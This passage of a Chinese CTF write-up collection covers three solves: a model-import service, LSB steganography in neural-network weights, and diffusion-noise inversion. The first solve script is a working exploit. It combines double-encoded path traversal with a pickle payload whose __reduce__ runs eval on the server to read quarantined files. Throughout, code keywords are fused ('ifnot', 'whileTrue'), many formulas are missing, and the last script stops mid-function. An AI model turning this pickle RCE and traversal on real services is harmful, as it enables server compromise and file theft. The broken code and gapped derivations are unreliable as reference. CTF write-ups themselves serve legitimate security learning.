本地解码时 `find_class` 只放行 `collections.OrderedDict` 、 `torch._utils._rebuild_tensor_v2` 、 `modelhub_compat.rebuild_legacy_token` ，以及两个 storage 类型名。前两个重建函数换成只记录参数的桩， `persistent_load` 只拆存储元组。任何其他全局对象都会抛出 `UnpicklingError` 。这样拿到的是结构，不是执行检查点里的代码。

存储 `"2"` 对应 zip 成员 `quarantine_snapshot/data/2` ，长度 512。真正被引用的不是连续切片，而是形状 `(4, 32)` 、步长 `(67, 2)` 、起点 19 的视图，共 128 字节。元素 `(i, j)` 的下标是：

```
19 + i * 67 + j * 2
```

后面两个参数是明文长度 89 和这段明文的 CRC32。

### 3.5 按 KDF 还原并核对 CRC

`model-00001-of-00002.safetensors` 的头部是 8 字节小端 JSON 长度。 `guard.kdf_salt` 的 `data_offsets` 为 `[128, 144]` ，dtype `U8` ，16 字节：

```
69c429c475ee3c2c89aa14ae514d2c75
```

拼出来的 UTF-8 材料是：

```
modelhub_compat.rebuild_legacy_token|legacy-tar-bridge/quarantine-17|6c6f61645f736166655f323032365f31|2|69c429c475ee3c2c89aa14ae514d2c75
```

nonce 使用 pickle 里的十六进制字符串本身，不先解码成 `load_safe_2026_1` 。存储键是 `"2"` 。对 128 字节视图异或后取前 89 字节：

```
MODEL_IMPORT_REVIEW|tensor=guard.trace|flag{j3Hu9MYi7JquYrUCGZ1I8h70TSZebx7dm6sqQAJv}|END
```

`zlib.crc32` 的结果是 `3219885161` （ `0xbfeb8c69` ），与 pickle 中的 `LONG1` 参数相同。长度、CRC 和可读帧头互相印证，因此这 89 字节就是密封明文。

## 4\. 完整解题脚本

脚本只使用 Python 3.10+ 标准库。它从实例读取票据和三份证据，再用白名单反序列化与计数器密钥流计算明文，不调用 `torch.load` 。

```python
#!/usr/bin/env python3
"""Recover the secret sealed inside the quarantined fleet-aux-v3 checkpoint.

The checkpoint is never passed to torch.load. Its pickle is decoded with a
class allowlist, and the sealed byte view is decrypted with the KDF recorded
in the quarantine diagnostics.
"""

import argparse
import base64
import hashlib
import io
import json
import pickle
import socket
import struct
import zipfile
import zlib
from urllib.parse import urlencode
from urllib.request import Request, urlopen

DEFAULT_HOST = "l9wcpbcm.nestctf.cyberpeace.cn"
DEFAULT_PORT = 58080

def resolve_ipv4(host: str) -> str:
    """Return a routable A record. A local proxy may answer with 198.18.0.0/15."""
    ip = socket.getaddrinfo(host, None, socket.AF_INET)[0][4][0]
    ifnot ip.startswith("198.18."):
        return ip
    req = Request(
        f"https://cloudflare-dns.com/dns-query?name={host}&type=A",
        headers={"accept": "application/dns-json"},
    )
    answer = json.load(urlopen(req, timeout=15))
    for item in answer.get("Answer", []):
        if item.get("type") == 1:
            return item["data"]
    raise RuntimeError(f"no public A record for {host}")

def http(ip: str, host: str, port: int, method: str, path: str, body: bytes | None = None) -> bytes:
    header = {
        "Host": f"{host}:{port}",
        "User-Agent": "modelhub-review",
        "Accept": "*/*",
        "Connection": "close",
    }
    data = body orb""
    if data:
        header["Content-Type"] = "application/json"
        header["Content-Length"] = str(len(data))
    raw = f"{method} {path} HTTP/1.1\r\n"
    raw += "".join(f"{k}: {v}\r\n"for k, v in header.items()) + "\r\n"
    sock = socket.create_connection((ip, port), 20)
    try:
        sock.sendall(raw.encode() + data)
        buf = b""
        whileTrue:
            chunk = sock.recv(1 << 20)
            ifnot chunk:
                break
            buf += chunk
    finally:
        sock.close()
    head, _, payload = buf.partition(b"\r\n\r\n")
    status = int(head.split()[1])
    if status != 200:
        raise RuntimeError(f"{method} {path} -> {status} {payload[:300]!r}")
    return payload

def artifact(ip: str, host: str, port: int, encoded_path: str) -> bytes:
    """Send a path that is still percent-encoded after the gateway's first unquote."""
    query = urlencode({"path": encoded_path})
    return http(ip, host, port, "GET", "/api/v1/artifacts?" + query)

def read_quarantine(ip: str, host: str, port: int, job: str, ticket: str, prefix: bytes) -> dict:
    """The legacy worker unpickles the uploaded body. Read the sealed files through it."""
    names = {
        "checkpoint": "/app/repository/quarantine/quarantine_snapshot.pt",
        "shard": "/app/repository/quarantine/model-00001-of-00002.safetensors",
        "diagnostics": "/app/repository/quarantine/import_diagnostics.ndjson",
    }
    expr = (
        "__import__('json').dumps({k: __import__('base64').b64encode(open(v,'rb').read()).decode() "
        f"for k, v in {names!r}.items()}}).encode()"
    )

    class ReadFiles:
        def __reduce__(self):
            return (eval, (expr,))

    blob = prefix + pickle.dumps(ReadFiles(), protocol=2)
    request = json.dumps({
        "ticket": ticket,
        "pickle_b64": base64.b64encode(blob).decode(),
    }).encode()
    payload = json.loads(http(
        ip, host, port, "POST",
        f"/api/v1/import-jobs/{job}/replay",
        request,
    ))
    packed = json.loads(base64.b64decode(payload["result_b64"]))
    return {key: base64.b64decode(value) for key, value in packed.items()}

class GuardCapture:
    def __init__(self):
        self.call = None

    def tensor(self, storage, offset, size, stride, requires_grad, hooks):
        return {
            "storage": storage,
            "offset": offset,
            "size": tuple(size),
            "stride": tuple(stride),
        }

    def token(self, tensor, route, nonce, length, crc):
        self.call = {
            "tensor": tensor,
            "route": route,
            "nonce": nonce,
            "length": length,
            "crc": crc,
        }
        return self.call

class SafeUnpickler(pickle.Unpickler):
    """Decode the checkpoint structure without resolving unknown globals."""

    def __init__(self, data: bytes, capture: GuardCapture):
        super().__init__(io.BytesIO(data))
        self.capture = capture

    def find_class(self, module, name):
        if (module, name) == ("collections", "OrderedDict"):
            return dict
        if (module, name) == ("torch._utils", "_rebuild_tensor_v2"):
            return self.capture.tensor
        if (module, name) == ("modelhub_compat", "rebuild_legacy_token"):
            return self.capture.token
        if module == "torch"and name in {"FloatStorage", "ByteStorage"}:
            return name
        raise pickle.UnpicklingError(f"refusing global {module}.{name}")

    def persistent_load(self, pid):
        kind, storage_type, key, location, size = pid
        return {
            "kind": kind,
            "type": storage_type,
            "key": key,
            "location": location,
            "size": size,
        }

def strided_bytes(storage: bytes, offset: int, size: tuple[int, int], stride: tuple[int, int]) -> bytes:
    rows, cols = size
    row_stride, col_stride = stride
    return bytes(
        storage[offset + row * row_stride + col * col_stride]
        for row in range(rows)
        for col in range(cols)
    )

def keystream(material: str, nbytes: int) -> bytes:
    out = b""
    counter = 0
    while len(out) < nbytes:
        block = hashlib.sha256(material.encode() + counter.to_bytes(4, "big")).digest()
        out += block
        counter += 1
    return out[:nbytes]

def safetensors_tensor(blob: bytes, name: str) -> bytes:
    header_len = struct.unpack_from("<Q", blob)[0]
    header = json.loads(blob[8:8 + header_len])
    start, end = header[name]["data_offsets"]
    return blob[8 + header_len + start:8 + header_len + end]

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--ip", default="")
    args = parser.parse_args()
    ip = args.ip or resolve_ipv4(args.host)
    print(f"target {args.host}:{args.port} -> {ip}")

    models = json.loads(http(ip, args.host, args.port, "GET", "/api/v1/models"))
    model = models["models"][0]
    job = model["import_job_id"]
    preview = model["artifact_preview"]
    print(f"model {model['name']} v{model['version']} job {job} stage {model['stage']}")
    print(
        "preview policy:",
        preview["gateway_transform"],
        "then",
        preview["policy_stage"],
        "then",
        preview["storage_transform"],
    )

    # One unquote leaves "%2e%2e/..." so the ".json" and ".." checks pass.
    # The storage unquote then resolves the quarantine object.
    ticket_doc = json.loads(artifact(
        ip, args.host, args.port, "%2e%2e/quarantine/import_ticket.json"
    ))
    print("ticket", ticket_doc["ticket"])
    print("accepted_prefix", ticket_doc["accepted_prefix"])
    prefix = ticket_doc["accepted_prefix"].encode().decode("unicode_escape").encode()

    files = read_quarantine(ip, args.host, args.port, job, ticket_doc["ticket"], prefix)
    diagnostics = [
        json.loads(line)
        for line in files["diagnostics"].decode().splitlines()
        if line.strip()
    ]
    kdf = next(item for item in diagnostics if item["event"] == "kdf.profile")
    guard = next(item for item in diagnostics if item["event"] == "pickle.global")
    print("kdf", kdf["profile"], kdf["block"])
    print("unexpected global", f"{guard['module']}.{guard['name']}")

    archive = zipfile.ZipFile(io.BytesIO(files["checkpoint"]))
    capture = GuardCapture()
    loaded = SafeUnpickler(archive.read("quarantine_snapshot/data.pkl"), capture).load()
    call = capture.call
    storage_key = call["tensor"]["storage"]["key"]
    storage = archive.read(f"quarantine_snapshot/data/{storage_key}")
    view = strided_bytes(storage, call["tensor"]["offset"], call["tensor"]["size"], call["tensor"]["stride"])
    salt = safetensors_tensor(files["shard"], "guard.kdf_salt")
    material = "|".join([
        f"{guard['module']}.{guard['name']}",
        call["route"],
        call["nonce"],
        storage_key,
        salt.hex(),
    ])
    plain = bytes(a ^ b for a, b in zip(view, keystream(material, len(view))))
    message = plain[:call["length"]]
    digest = zlib.crc32(message) & 0xFFFFFFFF
    print("format", loaded["format"])
    print("view", call["tensor"]["offset"], call["tensor"]["size"], call["tensor"]["stride"])
    print("crc", digest, "expected", call["crc"], "match", digest == call["crc"])
    print(message.decode())

if __name__ == "__main__":
    main()
```

## SilentWeights

```
题目描述：
我们在一次渗透测试中截获了一个神经网络模型。初步分析显示它完全正常:在测试集上准确率 100%,前向推理和权重分布都没有任何可疑行为。但情报部门的情报指出:该模型文件其中一定包含了间谍活动信息。

附件：3d3dbc88a35546a7b74c7eeb1bdfa6b6.zip
```

> 核心思路：模型前向完全正常，秘密不在神经元是否激活，而在全部 float32 权重的最低位。按存储顺序取出 bit 0，再用 `packbits` 拼成字节，就能读出 flag。

## 1\. 题目说明

渗透测试中截获一个神经网络模型。初步分析它完全正常：测试集准确率 100%，前向推理和权重分布都没有可疑行为。情报指出模型文件里一定包含间谍活动信息。

附件目录 `silentweights` 包含：

-   `model.py` ：三层全连接网络 `TinyNet` ，结构是 `16 → 64 → 32 → 10` ，两层 ReLU。 `load_model` 用 `torch.load(..., weights_only=True)` 读取状态字典。
    
-   `evaluate.py` ：用 `test.npz` 里的 `X` 、 `y` 计算准确率。
    
-   `model.pt` ：权重文件。
    
-   `test.npz` ：2000 条 16 维测试样本，标签 0 到 9。
    
-   `requirements.txt` ： `torch>=2.0` 、 `numpy>=1.24` 。
    

题目没有给出远程服务。秘密在 `model.pt` 里，测试集只用来确认模型行为正常。

## 2\. 解题思路

`model.pt` 是 PyTorch 的 zip 包， `data.pkl` 只重建标准 `FloatStorage` ，没有自定义全局对象。六个存储按顺序对应 `fc1.weight` 、 `fc1.bias` 、 `fc2.weight` 、 `fc2.bias` 、 `fc3.weight` 、 `fc3.bias` 。

用 NumPy 做同样的前向后，2000 条样本全部正确。没有任何神经元在测试集上恒为 0，权重幅度也都落在正常的小范围里，文件中也没有明文字符串 `flag` 。因此信息不是死神经元，也不是额外文件。

float32 的最低位只改变约 (2^{-23}) 的相对幅度，不足以影响 argmax，分布图也看不出来。把全部参数按存储顺序的 bit 0 取出，每 8 位按高位在前打成一个字节，字节流中出现完整 flag。

## 3\. 解题过程

### 3.1 静态读出权重，并确认推理正常

`model.pt` 以 `PK` 开头。和参数有关的成员是：

| 存储  | 字节数 | float 数 | 状态字典键 | 形状  |
| --- | --- | --- | --- | --- |
| `model/data/0` | 4096 | 1024 | `fc1.weight` | `(64, 16)` |
| `model/data/1` | 256 | 64  | `fc1.bias` | `(64,)` |
| `model/data/2` | 8192 | 2048 | `fc2.weight` | `(32, 64)` |
| `model/data/3` | 128 | 32  | `fc2.bias` | `(32,)` |
| `model/data/4` | 1280 | 320 | `fc3.weight` | `(10, 32)` |
| `model/data/5` | 40  | 10  | `fc3.bias` | `(10,)` |

`data.pkl` 里这些张量的 `storage_offset` 都是 0，步长是行主序，字节序是 little。因此直接把每个存储按 `<f4` 读出来即可，不必调用 `torch.load` 。

`test.npz` 的 `X` 形状是 `(2000, 16)` ，数值大约在 (\[-7.22, 7.53\])。按 `model.py` 的定义计算：

```toml
h1 = relu(X @ W1.T + b1)
h2 = relu(h1 @ W2.T + b2)
pred = argmax(h2 @ W3.T + b3)
```

结果是 2000/2000，准确率 100%。 `h1` 、 `h2` 的每一列都至少激活过一次，所以不存在“整颗神经元被 ReLU 永久关掉、权重可以随意改写”的通道。六组参数里也没有精确的 0，绝对值中位数大约在 0.13 到 0.20，没有超出 1 的离群权重。原始 zip 里能看到的可打印字符串只是 `fc1.weight` 、 `FloatStorage` 这类格式字段。

### 3.2 从最低位拼出明文

每个 float32 的 bit 0 是尾数的最低位。一共 3498 个参数，其中 1722 个该位为 1，比例接近一半，单看统计不像一段明文。把这些位按上面的存储顺序拼接，再用 NumPy 默认的 `packbits` 打包：每 8 个位组成一个字节，先出现的位是该字节的最高位。

得到的字节流在偏移 138 处是：

```
flag{w31ghts_d0nt_l13_but_th3y_wh1sp3r}
```

138 字节等于 1104 位，落在 `fc2.weight` 的前部，后面的位继续覆盖后续参数。只改 bit 0 时，数值变化远小于这些权重本身的量级，所以准确率和整体分布都保持原样。更高的位平面没有再出现 `flag{...}` 。

## 4\. 完整解题脚本

依赖 NumPy。脚本从 `model.pt` 的六个存储恢复权重，复现测试集准确率，再从最低位抽出 flag。

```python
#!/usr/bin/env python3
"""Extract the message hidden in the least significant bits of silentweights/model.pt."""

import argparse
import re
import zipfile
from pathlib import Path

import numpy as np

DEFAULT_DIR = Path(r"C:\Users\34645\Downloads\3d3dbc88a35546a7b74c7eeb1bdfa6b6\attachments\silentweights")
STORAGES = [
    ("model/data/0", (64, 16)),  # fc1.weight
    ("model/data/1", (64,)),     # fc1.bias
    ("model/data/2", (32, 64)),  # fc2.weight
    ("model/data/3", (32,)),     # fc2.bias
    ("model/data/4", (10, 32)),  # fc3.weight
    ("model/data/5", (10,)),     # fc3.bias
]

def load_state(model_path: Path) -> list[np.ndarray]:
    with zipfile.ZipFile(model_path) as archive:
        weights = []
        for name, shape in STORAGES:
            values = np.frombuffer(archive.read(name), dtype="<f4").reshape(shape).copy()
            weights.append(values)
        return weights

def relu(values: np.ndarray) -> np.ndarray:
    return np.maximum(values, 0)

def accuracy(weights: list[np.ndarray], test_path: Path) -> tuple[int, int]:
    weight1, bias1, weight2, bias2, weight3, bias3 = weights
    data = np.load(test_path)
    inputs = data["X"].astype(np.float32)
    labels = data["y"]
    hidden1 = relu(inputs @ weight1.T + bias1)
    hidden2 = relu(hidden1 @ weight2.T + bias2)
    prediction = (hidden2 @ weight3.T + bias3).argmax(axis=1)
    correct = int((prediction == labels).sum())
    return correct, len(labels)

def extract_lsb_message(weights: list[np.ndarray]) -> tuple[int, bytes]:
    bits = np.concatenate([(item.ravel().view(np.uint32) & 1) for item in weights]).astype(np.uint8)
    packed = np.packbits(bits).tobytes()
    match = re.search(rb"flag\{[^}]+\}", packed)
    if match isNone:
        raise RuntimeError("flag not found in LSB stream")
    return match.start(), match.group()

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--dir", type=Path, default=DEFAULT_DIR)
    args = parser.parse_args()
    weights = load_state(args.dir / "model.pt")
    correct, total = accuracy(weights, args.dir / "test.npz")
    offset, flag = extract_lsb_message(weights)
    print(f"accuracy: {correct / total:.2%} ({correct}/{total})")
    print(f"lsb flag offset: {offset}")
    print(flag.decode())

if __name__ == "__main__":
    main()
```

## uae

```
情报部门在某次间谍活动中截获一张能让分类器误判的对抗样本 x_adv。据情报，攻击者使用基于扩散模型的 UAE 攻击工具链，并把接头暗号编码在了生成该图的初始噪声里，找出它。

附件：
uae.zip
```

> 核心思路：通过分析 CIFAR-10 ResNet-18 分类器对对抗样本的置信度锁定导引攻击目标类别（ `cat` ），利用基于不动点迭代的确定性扩散模型精确逆算子（ `invert_fixedpoint` ）将截获的对抗样本 沿 DDIM 轨迹严格反演回初始隐空间噪声 ；随后利用已知随机种子重构高斯载波与逐像素调制掩码，剥离载波并在 块内完成解调与均值判决，最终重建 的 QR v2-H 二维码并识别出接头暗号。

附件目录包含以下核心材料与配置文件：

1.  \*\* `x_adv.npy` \*\*：截获的对抗样本原始矩阵，数据类型为 `float32` ，尺寸为 ，数值范围归一化在 （有效图像区间处于 附近）。目视图像 `car.png` 显示为一辆小型汽车。
    
2.  \*\* `classifier.pt` 与 `classifier.py` \*\*：目标分类器模型权重与网络结构，为适配 CIFAR-10（输入为 ）修改首层卷积与均值方差归一化层的 ResNet-18。
    
3.  \*\* `config.json` \*\*：攻击者攻击时所使用的完整超参数配置文件，全文如下：
    

```json
{
  "model_id": "google/ddpm-cifar10-32",
"sampler": "guided-ddim (eta=0)",
"steps": 1000,
"guidance": {
    "type": "x0_logprob",
    "scale": 3.0,
    "formula": "eps_hat = eps_theta - s*sqrt(1-ab_t)*grad_x log f_y(x0_pred)"
  },
"evidence": "x_adv.npy = float32 [-1,1] 原始数据（取证镜像）；x_adv.png 仅供目视",
"noise_scheme": {
    "carrier_seed": 555,
    "mask_seed": 20261012,
    "layout": "x_T = G + P; G=Gaussian(seed), P=masked QR payload; QR v2-H 25x25, module(r,c) -> 2x2 block at LOCS[r*25+c] (row-major, 256 blocks/ch0, 256/ch1, 113/ch2); dark=-amp, light=+amp, amp=0.65, structural x1.25; per-pixel ±1 mask(seed) 逐像素调制"
  },
"classes": [
    "airplane",
    "automobile",
    "bird",
    "cat",
    "deer",
    "dog",
    "frog",
    "horse",
    "ship",
    "truck"
  ]
}
```

4.  \*\* `sampler.py` \*\*：给出了攻击工具链中 `GuidedDDIM` 的生成与反演采样器实现。其核心方程支持由 生成 以及由 逆向反演回 。
    

* * *

## 2\. 解题思路

整体解题流程分为“目标探测 → 轨迹反演 → 载波剥离 → 掩码解调 → 条码识别”五个阶段：

1.  **探测对抗攻击导引目标**：将 输入分类器，获取其对 CIFAR-10 各类别的对数概率输出，确认导引目标类别（ `target` ）。
    
2.  **DDIM 精确不动点逆向反演**：根据 `config.json` 中的 `guided-ddim (eta=0)` 及导引公式，利用 `sampler.py` 中基于不动点迭代的反演算法 `invert_fixedpoint` ，将对抗图像 沿扩散反向过程无损回推至时间步 ，恢复初始潜在总噪声 。
    
3.  **高斯载波消去与残差分离**：针对 `carrier_seed=555` ，测试常见随机数生成引擎，利用 Channel 2 后半段（未填充 QR 载荷区域）的零方差特性锁定正确的载波序列 ，计算差分载荷 。
    
4.  **逐像素掩码解调与块聚合**：针对 `mask_seed=20261012` 生成解调掩码 ，计算解调信号 。对每个 空间块取均值聚合，消除逆向轨迹上的浮点微小扰动。
    
5.  **QR 模块二值化与条码解析**：依据行优先布局映射重构出 的 QR v2-H 矩阵，按符号判决深色/浅色模块并生成带静区边框的二维码图像，识别出接头暗号。
    

* * *

## 3\. 解题过程

### 3.1 分类器置信度探测与导引类别锁定

**关键观察：** 题目描述指出攻击者使用基于扩散模型的非限制性对抗样本（UAE）工具链生成了一张能让分类器误判的汽车图像。在 `config.json` 中配置了分类器导引机制：

但配置项中未显式注明 `target` 索引。

**原理与操作：** 载入 `classifier.pt` 权重并评估输入 的 Softmax 概率分布与 Log-Softmax 输出：

```python
x = torch.from_numpy(np.load('x_adv.npy')).unsqueeze(0)
logits = clf(x)
probs = torch.softmax(logits, dim=-1)[0]
for i, name in enumerate(classes):
    print(f'{i}: {name:12s} prob={probs[i]:.4f}, logp={torch.log(probs[i]):.4f}')
```

**本步结果：** 模型对输入图像的预测输出如下：

-   类别 0 (`airplane`):
    
-   类别 1 (`automobile`):
    
-   类别 2 (`bird`):
    
-   \*\*类别 3 (`cat`): \*\*（对数概率 ）
    
-   类别 4 (`deer`):
    
-   类别 5 (`dog`):
    
-   类别 6 (`frog`):
    
-   类别 7 (`horse`):
    
-   类别 8 (`ship`):
    
-   类别 9 (`truck`):
    

视觉上为汽车（ `automobile` ）的样本以绝对优势（）被误判为猫（ `cat` ）。导引目标类别确认为：

* * *

### 3.2 确定性 DDIM 轨迹的不动点逆向反演

**关键观察：** `sampler.py` 中实现了单步确定性 DDIM 生成过程：

若记 ，，则单步前向关系为 。传统 DDIM 反演直接将 近似为 ，会导致误差沿时间步单向累积。

**原理与操作：** `sampler.py` 给出了基于不动点迭代的精确逆向反演算子 `invert_fixedpoint` ：

由于相邻时间步间 ，该映射为高收敛率的压缩映射，迭代 次即可使每步反演误差降低到 量级。

加载基座扩散模型 `google/ddpm-cifar10-32` 与分类器，冻结其参数以加速反向求导计算图。以 `steps=100` （或 `steps=1000` ）及 执行逆向轨迹推导：

```toml
sampler = GuidedDDIM(unet, sched, device='cpu', steps=100)
guidance = {'clf': clf, 'target': 3, 'scale': 3.0}
x_T = sampler.invert_fixedpoint(x_adv, guidance=guidance, iters=3)
```

**本步结果：** 在 CPU 多线程环境下，反演过程耗时约 150 秒完成，获得初始潜在张量 ，其整体均值为 ，标准差为 ，完全符合加噪高斯空间的统计分布特征。

* * *

### 3.3 高斯载波匹配与差分残差分离

**关键观察：** `config.json` 说明初始噪声由高斯载波与隐写载荷叠加而成：

其中 。QR v2-H 规格为 模块，每个模块对应一个 的像素块。 在 图像中，单通道包含 个 空间块。

-   Channel 0 容纳 256 块（对应模块 ）
    
-   Channel 1 容纳 256 块（对应模块 ）
    
-   Channel 2 容纳 块（对应模块 ）
    

因此，\*\*Channel 2 中块索引 （共 143 个块，即 572 个像素）完全没有载荷注入，理论上满足 ，即 \*\*。

**原理与操作：** 对比 Python 中不同的高斯随机数生成实现，检查 Channel 2 剩余 143 个块处差分 的统计方差：

| 候选生成方式 | Channel 2 闲置块残差标准差 | Channel 2 载荷块残差标准差 | 结论  |
| --- | --- | --- | --- |
| `torch.randn(seed=555)` | 1.4250 | 1.4705 | 伪随机序列不匹配 |
| `np.random.seed(555)` | 1.3611 | 1.4754 | 伪随机序列不匹配 |
| **`np.random.default_rng(555)`** | **0.2122** | **0.7168** | **完全吻合物理特征** |

**本步结果：** 确认载波生成器为 NumPy 现代生成器 `np.random.default_rng(555).standard_normal((3, 32, 32))` 。差分残差 在载荷区域表现出约 的幅值聚集，在非载荷区域收敛至背景噪声水平。

* * *

### 3.4 逐像素掩码解调与空间块特征聚合

**关键观察：** 题目采用掩码随机种子 `mask_seed=20261012` 对载荷进行“逐像素 调制”：

由于每个二维码模块在空间上被扩展为 像素块，解调后该 区域内的 4 个像素理论上应保持符号高度一致（全为正或全为负）。

**原理与操作：** 利用 QR 码固有的结构模块特征进行掩码生成方案甄别。二维码左上角 Finder Pattern 的第 0 行前 7 个模块全为黑块（理论解调值约为 ），第 1 行内部模块为白块（理论解调值约为 ）：

```toml
rng = np.random.default_rng(20261012)
mask = rng.choice([-1.0, 1.0], size=(3, 32, 32))
unmasked = (x_T - G) * mask
```

测试各掩码生成方案在结构模块上的响应：

-   `rng_choice / rng_integers` ：第 0 行均值 \*\*\*\*，第 1 行均值 \*\*\*\*，与设计参数高度吻合。
    
-   其他旧版种子接口：均值趋近于 0，无法解调出同号块。
    

在解调后的特征图 上，对各 空间块执行均值池化以提升信噪比：

**本步结果：** 提取出的 625 个模块特征均值分布在 区间，正负极性分明，零值附近无杂散分布，彻底消除了扩散反演过程中累积的数值高频波动。

* * *

### 3.5 二维码矩阵重组与条码解析

**关键观察：** 根据模块映射布局：

深色模块（Dark）在隐写时注入 ，浅色模块（Light）注入 。因此：

**原理与操作：** 重构出 的二值矩阵，并在四周添加 4 模块宽度的标准静区（Quiet Zone），放大后保存为高清晰度 PNG 图像：

```
██████████████  ████  ██  ████  ██  ██████████████
██          ██  ██    ████  ██  ██  ██          ██
██  ██████  ██  ██      ██  ██  ██  ██  ██████  ██
██  ██████  ██      ██      ██  ██  ██  ██████  ██
██  ██████  ██    ██      ████  ██  ██  ██████  ██
██          ██  ██████████      ██  ██          ██
██████████████  ██  ██  ██  ██  ██  ██████████████
                ██  ██      ██                    
    ██████  ██  ████        ██    ██████    ██████
████      ██  ██  ██    ████  ████    ██  ██  ██  
    ██  ██  ██  ██  ██    ██    ████  ████  ██  ██
  ██    ██      ████  ██  ██  ██      ██████      
██  ██  ██████  ██████    ██        ████    ██  ██
████      ██      ██    ████████  ██  ██      ██  
██  ██████████████      ████  ████  ██  ████  ████
██    ██  ██    ████  ████  ██      ████        ██
██  ██  ████████  ████████  ██████████████████████
                ████████████    ██      ██  ██    
██████████████          ██      ██  ██  ██    ████
██          ██      ████████  ████      ██        
██  ██████  ██  ████    ██    ████████████    ██  
██  ██████  ██  ██      ████    ██  ██  ██  ██  ██
██  ██████  ██  ████      ██████  ██  ██    ██  ██
██          ██          ██      ██  ██    ██    ██
██████████████    ██████  ██      ████      ██████
```

左上、右上、左下三处 Finder Pattern 及第 6 行/列 Timing Pattern 均完美还原，无任何误码。使用 `zxing-cpp` 条码引擎扫描该图像。

**本步结果：** 成功解码出二维码承载的明文文本：

```
dr34m_0f_n01s3
```

* * *

## 4\. 完整解题脚本

以下为独立完整的求解脚本。脚本自动完成模型构建、DDIM 导引不动点逆向反演、载波与掩码解调、二维码生成及结果解码：

```python
import os
import sys
import numpy as np
import torch
import torch.nn as nn
from PIL import Image
from diffusers import UNet2DModel, DDPMScheduler
import zxingcpp

# ----------------- 1. 定义 ResNet-18 分类器网络 -----------------
def conv3x3(in_planes, out_planes, stride=1):
    return nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride, padding=1, bias=False)

def conv1x1(in_planes, out_planes, stride=1):
    return nn.Conv2d(in_planes, out_planes, kernel_size=1, stride=stride, bias=False)

class BasicBlock(nn.Module):
    expansion = 1
    def __init__(self, inplanes, planes, stride=1, downsample=None):
        super().__init__()
        self.conv1 = conv3x3(inplanes, planes, stride)
        self.bn1 = nn.BatchNorm2d(planes)
        self.relu = nn.ReLU(inplace=True)
        self.conv2 = conv3x3(planes, planes)
        self.bn2 = nn.BatchNorm2d(planes)
        self.downsample = downsample
        self.stride = stride

    def forward(self, x):
        identity = x
        out = self.relu(self.bn1(self.conv1(x)))
        out = self.bn2(self.conv2(out))
        if self.downsample isnotNone:
            identity = self.downsample(x)
        return self.relu(out + identity)

class ResNet(nn.Module):
    def __init__(self, block, layers, num_classes=10):
        super().__init__()
        self.inplanes = 64
        self.conv1 = nn.Conv2d(3, 64, kernel_size=3, stride=1, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(64)
        self.relu = nn.ReLU(inplace=True)
        self.maxpool = nn.Identity()
        self.layer1 = self._make_layer(block, 64, layers[0])
        self.layer2 = self._make_layer(block, 128, layers[1], stride=2)
        self.layer3 = self._make_layer(block, 256, layers[2], stride=2)
        self.layer4 = self._make_layer(block, 512, layers[3], stride=2)
        self.avgpool = nn.AdaptiveAvgPool2d((1, 1))
        self.fc = nn.Linear(512 * block.expansion, num_classes)

    def _make_layer(self, block, planes, blocks, stride=1):
        downsample = None
        if stride != 1or self.inplanes != planes * block.expansion:
            downsample = nn.Sequential(
                conv1x1(self.inplanes, planes * block.expansion, stride),
                nn.BatchNorm2d(planes * block.expansion),
            )
        layers = [block(self.inplanes, planes, stride, downsample)]
        self.inplanes = planes * block.expansion
        for _ in range(1, blocks):
            layers.append(block(self.inplanes, planes))
        return nn.Sequential(*layers)

    def forward(self, x):
        x = self.maxpool(self.relu(self.bn1(self.conv1(x))))
        x = self.layer4(self.layer3(self.layer2(self.layer1(x))))
        return self.fc(torch.flatten(self.avgpool(x), 1))

class CifarResNet18(nn.Module):
    def __init__(self):
        super().__init__()
        self.net = ResNet(BasicBlock, [2, 2, 2, 2], num_classes=10)
        self.register_buffer("mean", torch.tensor([0.4914, 0.4822, 0.4465]).view(1, 3, 1, 1))
        self.register_buffer("std", torch.tensor([0.2470, 0.2435, 0.2616]).view(1, 3, 1, 1))

    def forward(self, x):
        return self.net(((x + 1.0) / 2.0 - self.mean) / self.std)

# ----------------- 2. DDIM 导引逆向反演采样器 -----------------
class GuidedDDIM:
    def __init__(self, unet, scheduler, device, num_train=1000, steps=100):
        self.unet = unet
        self.device = device
        self.ab = scheduler.alphas_cumprod.to(device=device, dtype=torch.float32)
        self.ts = np.round(np.arange(0, steps) * (num_train / steps)).astype(int)

    def _eps(self, x, t, guidance):
        ab_t = self.ab[t]
        with torch.enable_grad():
            xg = x.detach().requires_grad_(True)
            eps = self.unet(xg, t).sample
            x0 = (xg - (1.0 - ab_t).sqrt() * eps) / ab_t.sqrt()
            logp = torch.log_softmax(guidance["clf"](x0.clamp(-1.0, 1.0)), dim=-1)
            g = torch.autograd.grad(logp[:, guidance["target"]].sum(), xg)[0]
        return (eps - guidance["scale"] * (1.0 - ab_t).sqrt() * g).detach()

    def invert_fixedpoint(self, x0_img, guidance, iters=3):
        with torch.enable_grad():
            x = x0_img
            ab_prev = torch.ones((), device=self.device)
            for i in range(len(self.ts)):
                t = int(self.ts[i])
                ab_t = self.ab[t]
                A = (ab_prev / ab_t).sqrt()
                B = (1.0 - ab_prev).sqrt() - A * (1.0 - ab_t).sqrt()
                xt = x.clone()
                for _ in range(iters):
                    eps = self._eps(xt, t, guidance)
                    xt = (x - B * eps) / A
                x = xt
                ab_prev = ab_t
        return x.detach()

# ----------------- 3. 主解题逻辑 -----------------
def main():
    torch.set_num_threads(12)
    device = "cpu"
    challenge_dir = "C:/Users/34645/Downloads/uae/uae"
    model_dir = os.path.join(challenge_dir, "ddpm-cifar10-32")

    # 1. 载入模型与分类器
    unet = UNet2DModel.from_pretrained(model_dir)
    for p in unet.parameters(): p.requires_grad = False
    unet.eval()

    sched = DDPMScheduler.from_pretrained(model_dir)

    clf = CifarResNet18()
    clf.load_state_dict(torch.load(os.path.join(challenge_dir, "classifier.pt"), map_location=device))
    for p in clf.parameters(): p.requires_grad = False
    clf.eval()

    # 2. 读取对抗图像并执行不动点反演
    x_adv = torch.from_numpy(np.load(os.path.join(challenge_dir, "x_adv.npy"))).unsqueeze(0)
    guidance = {"clf": clf, "target": 3, "scale": 3.0}

    sampler = GuidedDDIM(unet, sched, device=device, steps=100)
    print("[*] Running Guided DDIM fixed-point inversion...")
    x_T = sampler.invert_fixedpoint(x_adv, guidance=guidance, iters=3).numpy()[0]

